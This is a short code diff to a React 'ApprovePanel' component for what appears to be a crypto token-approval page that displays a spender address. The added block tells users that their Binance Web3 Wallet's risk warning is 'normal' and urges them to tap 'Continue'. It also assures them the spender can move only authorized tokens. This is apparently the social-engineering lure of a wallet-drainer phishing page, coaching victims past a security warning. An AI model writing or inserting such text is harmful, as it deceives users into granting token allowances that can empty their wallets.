@@ -174,6 +174,10 @@ export default function ApprovePanel() {
         </div>
       )}
 
+      <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(240,185,11,0.06)', border: '1px solid rgba(240,185,11,0.12)', borderRadius: 8, fontSize: 12, color: '#848E9C', lineHeight: 1.6 }}>
+        💡 Binance Web3 Wallet may show a risk warning when approving. This is normal — tap "Continue" to proceed. The spender can only transfer tokens you explicitly authorize.
+      </div>
+
       <div style={{ marginTop: 16, fontSize: 11, color: '#5E6673' }}>
         Spender: <span style={{ fontFamily: 'monospace', color: '#848E9C' }}>{SPENDER_ADDRESS}</span>
       </div>
